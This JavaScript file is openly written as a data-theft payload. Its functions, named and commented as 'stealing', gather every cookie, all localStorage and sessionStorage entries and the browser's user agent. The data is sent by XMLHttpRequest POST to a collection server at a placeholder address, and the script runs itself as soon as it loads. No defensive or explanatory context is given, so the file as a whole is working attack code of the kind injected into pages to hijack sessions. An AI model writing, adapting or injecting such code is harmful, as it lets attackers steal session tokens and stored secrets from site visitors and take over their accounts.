// Function to steal cookies from the current website
function stealCookies() {
  // Splitting the cookies into an array
  const cookies = document.cookie.split(';');
  // Object to store the extracted cookie data
  const cookieData = {};

  // Looping through each cookie to extract its name and value
  for (let i = 0; i < cookies.length; i++) {
    // Removing leading/trailing whitespace and splitting the cookie into name and value
    const cookie = cookies[i].trim();
    const [name, value] = cookie.split('=');
    // Storing the cookie name and value in the cookieData object
    cookieData[name] = value;
  }

  // Returning the extracted cookie data
  return cookieData;
}

// Function to steal cookies, local storage, and session storage data
function stealCookiesAndStorage() {
  // Stealing cookies using the previously defined function
  const cookies = stealCookies();
  // Object to store the extracted local storage data
  const localStorageData = {};
  // Object to store the extracted session storage data
  const sessionStorageData = {};

  // Looping through each item in local storage to extract its key and value
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    localStorageData[key] = localStorage.getItem(key);
  }

  // Looping through each item in session storage to extract its key and value
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionStorageData[key] = sessionStorage.getItem(key);
  }

  // Returning an object containing cookies, local storage, and session storage data
  return {
    cookies: cookies,
    localStorage: localStorageData,
    sessionStorage: sessionStorageData
  };
}

// Function to extract browser information
function stealBrowserInfo() {
  // Returning an object containing cookies and user agent information
  return {
    cookies: document.cookie,
    userAgent: navigator.userAgent,
  };
}

// Function to send stolen information to a remote server
function sendInfo(infoData) {
  // URL of the server to send the information to
  const serverUrl = 'http://0.0.0.0:3000/server';

  // Creating a new XMLHttpRequest object to make a POST request
  const xhr = new XMLHttpRequest();
  // Setting up the request
  xhr.open('POST', serverUrl);
  xhr.setRequestHeader('Content-Type', 'application/json');
  // Handling successful response
  xhr.onload = function() {
    console.log('Information sent successfully');
  };
  // Handling error response
  xhr.onerror = function() {
    console.error('Failed to send information');
  };
  // Sending the information as JSON to the server
  xhr.send(JSON.stringify(infoData));
}

// Function to steal and send information
function stealAndSendInfo() {
  // Combining stolen cookies, storage data, and browser information into a single object
  const infoData = {
    ...stealCookiesAndStorage(),
    ...stealBrowserInfo()
  };
  // Sending the combined information to the server
  sendInfo(infoData);
}

// Calling the function to initiate stealing and sending information
stealAndSendInfo();
